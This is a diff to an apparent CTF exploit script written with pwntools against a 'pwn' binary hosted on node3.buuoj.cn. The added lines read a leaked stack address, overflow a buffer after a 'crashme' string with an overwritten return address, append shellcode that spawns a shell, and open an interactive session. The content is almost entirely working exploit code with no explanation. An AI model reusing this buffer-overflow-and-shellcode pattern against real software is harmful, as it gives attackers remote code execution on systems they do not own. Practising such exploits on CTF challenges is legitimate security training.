@@ -27,15 +27,18 @@ uu32    = lambda data               :u32(data.ljust(4,'\0'))
 uu64    = lambda data               :u64(data.ljust(8,'\0'))
 leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
 
-context.log_level = 'DEBUG'
+context(arch='amd64', os='linux', log_level = 'DEBUG')
 binary = './pwn'
-context.binary = binary
 elf = ELF(binary)
-p = remote('node3.buuoj.cn',29776) if argv[1]=='r' else process(binary)
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+p = remote('node3.buuoj.cn',20000) if argv[1]=='r' else process(binary)
 
 # start
+ru('crash: ')
+ss = int(ru('\n'),16)
+leak('ss',ss)
 
+payload = 'crashme\x00'.ljust(26,'\x00') + p32(ss-0x1c) + asm(shellcraft.sh())
+sl(payload)
 # end
 
 itr()
